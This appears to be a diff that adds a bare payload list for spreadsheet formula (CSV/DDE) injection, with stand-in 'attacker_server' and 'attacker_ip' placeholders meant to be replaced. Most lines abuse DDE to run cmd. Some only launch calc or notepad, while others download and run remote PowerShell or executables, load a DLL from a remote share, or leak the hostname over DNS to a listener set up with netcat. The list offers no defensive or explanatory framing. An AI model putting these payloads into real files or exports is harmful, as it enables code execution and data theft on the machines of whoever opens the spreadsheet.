@@ -1,0 +1,15 @@
+# match/replace 'attacker_server' and 'attacker_ip'
+=NOW()
+=SUM(1,1)
+=DDE("cmd";"/C calc";"!A0")A0
+@SUM(1+9)*cmd|' /C calc'!A0
+=10+20+cmd|' /C calc'!A0
+=cmd|' /C notepad'!'A1'
+=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
+=cmd|'/c rundll32.exe \\attacker_ip\3\2\1.dll,0'!_xlbgnm.A1
+=WEBSERVICE(“http://attacker_server”)
+=cmd|'/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString("http://attacker_server/shell.ps1");
+
+# nc -vulp 53 on attacker_server
+=CMD|’/c for /f "delims=" %a in ('hostname') do nslookup %a.attacker_server ’|!A0 
+=CMD|’/c powershell nslookup attacker_server’|!A1
